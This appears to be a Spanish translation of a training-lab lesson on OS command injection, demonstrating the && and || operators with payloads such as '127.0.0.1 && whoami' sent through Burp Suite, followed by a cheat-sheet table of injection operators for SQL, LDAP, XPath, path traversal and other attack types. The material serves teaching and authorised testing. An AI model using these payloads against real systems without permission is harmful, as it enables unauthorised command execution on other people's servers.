
# Otros operadores de inyección

Antes de continuar, probemos algunos otros operadores de inyección y veamos de qué manera diferente los manejaría la aplicación web.

***

## <mark style="color:purple;">Operador AND</mark>

Podemos comenzar con el operador `AND`( `&&`), de modo que nuestra carga útil final sería ( `127.0.0.1 && whoami`), y el comando ejecutado final sería el siguiente:

```bash
ping -c 1 127.0.0.1 && whoami
```

Como siempre debemos hacer, intentemos ejecutar primero el comando en nuestra máquina virtual Linux para asegurarnos de que sea un comando que funcione:

```shell-session
afsh4ck@kali$ ping -c 1 127.0.0.1 && whoami

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=1.03 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 1.034/1.034/1.034/0.000 ms
21y4d
```

Como podemos ver, el comando se ejecuta y obtenemos el mismo resultado que obtuvimos anteriormente.

Ahora, podemos hacer lo mismo que hicimos antes copiando nuestra carga útil, pegándola en nuestra solicitud HTTP `Burp Suite`, codificándola en URL y finalmente enviándola:&#x20;

<figure><img src="https://academy.hackthebox.com/storage/modules/109/cmdinj_basic_AND.jpg" alt=""><figcaption></figcaption></figure>

Como podemos ver, inyectamos exitosamente nuestro comando y recibimos el resultado esperado de ambos comandos.

***

## <mark style="color:purple;">Operador OR</mark>

Por último, probemos el operador de inyección `OR`( `||`). El operador `OR` solo ejecuta el segundo comando si el primero no se ejecuta. Esto puede resultarnos útil en casos en los que nuestra inyección interrumpiría el comando original sin tener una forma sólida de hacer que ambos comandos funcionen. Por lo tanto, el uso del operador `OR` haría que nuestro nuevo comando se ejecute si el primero falla.

Si intentamos utilizar nuestro payload habitual con el operador `||` ( `127.0.0.1 || whoami`), veremos que solo se ejecutará el primer comando:

```shell-session
afsh4ck@kali$ ping -c 1 127.0.0.1 || whoami

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.635 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.635/0.635/0.635/0.000 ms
```

Esto se debe a la forma en que `bash`funcionan los comandos. Como el primer comando devuelve un código de salida `0`que indica que la ejecución se realizó correctamente, el `bash`comando se detiene y no intenta ejecutar el otro comando. Solo intentaría ejecutar el otro comando si el primer comando fallara y devolviera un código de salida `1`.

Intentemos romper intencionalmente el primer comando al no proporcionar una IP y usar directamente el operador  `||`( `|| whoami`), de modo que el comando `ping` falle y nuestro comando inyectado se ejecute:

```shell-session
afsh4ck@kali$ ping -c 1 || whoami

ping: usage error: Destination address required
afsh4ck
```

Como podemos ver, esta vez, el comando `whoami` se ejecutó después de que el comando  `ping` fallara y nos dio un mensaje de error. Por lo tanto, ahora probemos la carga útil (`|| whoami`) en nuestra solicitud HTTP:&#x20;

<figure><img src="https://academy.hackthebox.com/storage/modules/109/cmdinj_basic_OR.jpg" alt=""><figcaption></figcaption></figure>

Vemos que esta vez solo obtuvimos la salida del segundo comando como se esperaba. Con esto, estamos usando una carga útil mucho más simple y obteniendo un resultado mucho más limpio.

Estos operadores se pueden utilizar para varios tipos de inyección, como inyecciones SQL, inyecciones LDAP, XSS, SSRF, XML, etc. Hemos creado una lista de los operadores más comunes que se pueden utilizar para inyecciones:

<table data-header-hidden><thead><tr><th width="329"></th><th></th></tr></thead><tbody><tr><td><strong>Tipo de inyección</strong></td><td><strong>Operadores</strong></td></tr><tr><td>SQL Injection</td><td><code>'</code> <code>,</code> <code>;</code> <code>--</code> <code>/* */</code></td></tr><tr><td>Command Injection</td><td><code>;</code> <code>&#x26;&#x26;</code></td></tr><tr><td>LDAP Injection</td><td><code>*</code> <code>(</code> <code>)</code> <code>&#x26;</code> <code>|</code></td></tr><tr><td>XPath Injection</td><td><code>'</code> <code>or</code> <code>and</code> <code>not</code> <code>substring</code> <code>concat</code> <code>count</code></td></tr><tr><td>OS Command Injection</td><td><code>;</code> <code>&#x26;</code> <code>|</code></td></tr><tr><td>Code Injection</td><td><code>'</code> <code>;</code> <code>--</code> <code>/* */</code> <code>$()</code> <code>${}</code> <code>#{}</code> <code>%{}</code> <code>^</code></td></tr><tr><td>Directory Traversal/File Path Traversal</td><td><code>../</code> <code>..\\</code> <code>%00</code></td></tr><tr><td>Object Injection</td><td><code>;</code> <code>&#x26;</code> <code>|</code></td></tr><tr><td>XQuery Injection</td><td><code>'</code> <code>;</code> <code>--</code> <code>/* */</code></td></tr><tr><td>Shellcode Injection</td><td><code>\x</code> <code>\u</code> <code>%u</code> <code>%n</code></td></tr><tr><td>Header Injection</td><td> <code>\r</code>  <code>%0d</code> <code>%0a</code> <code>%09</code></td></tr></tbody></table>

Tenga en cuenta que esta tabla está incompleta y que son posibles muchas otras opciones y operadores. También depende en gran medida del entorno con el que estemos trabajando y probando.

En este módulo, nos ocuparemos principalmente de inyecciones de comandos directos, en las que nuestra entrada va directamente al comando del sistema y recibimos la salida del comando.&#x20;
